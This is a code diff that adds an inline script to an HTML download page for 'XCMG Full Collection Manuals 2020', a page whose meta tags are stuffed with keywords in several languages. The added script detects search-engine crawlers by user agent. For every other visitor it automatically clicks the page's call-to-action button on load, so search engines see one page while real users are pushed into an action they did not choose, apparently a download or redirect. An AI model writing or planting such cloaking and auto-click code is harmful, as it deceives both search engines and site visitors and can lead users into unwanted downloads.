@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XCMG Full Collection Manuals 2020</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the comprehensive XCMG Full Collection Manuals 2020 in PDF format, covering parts catalogs, operation, maintenance, and service manuals">
     <meta name="keywords" content="XCMG Full Collection Manuals 2020, XCMG manuals 2020, XCMG parts catalog free download, XCMG operation manual pdf, XCMG maintenance manual 2020, XCMG operator's manual 2020, XCMG service manual download, XCMG instruction manual English, XCMG manual free download, скачать руководства XCMG 2020, XCMG мануал скачать бесплатно, XCMG запчасти руководство 2020, руководство по эксплуатации XCMG скачать, XCMG инструкции по техническому обслуживанию, руководства XCMG скачать pdf, XCMG мануалы на китайском языке, XCMG краны руководства скачать, руководство для XCMG экскаватор скачать бесплатно, manuale XCMG 2020 gratis, catalogo parti XCMG download gratuito, manuale operatore XCMG scarica pdf, manuale manutenzione XCMG 2020, XCMG下载手册2020, XCMG维护手册下载, XCMG零件目录免费下载, XCMG操作手册pdf, скачать XCMG краны руководства, скачать XCMG экскаватор мануалы, XCMG трактор скачать руководство, XCMG manuals download, XCMG parts catalog, XCMG operation manual, XCMG maintenance manual, XCMG operator's manual, XCMG service manual, XCMG instruction manual, XCMG manuals collection 2020, XCMG pdf manuals 2020, XCMG book download 2020, XCMG manuals 2020 free download, XCMG manual pdf free download, XCMG pdf manuals free download, XCMG crane manuals, XCMG excavator manuals 2020, XCMG machinery manuals collection, XCMG manuals 2020 high speed download">
     <style>
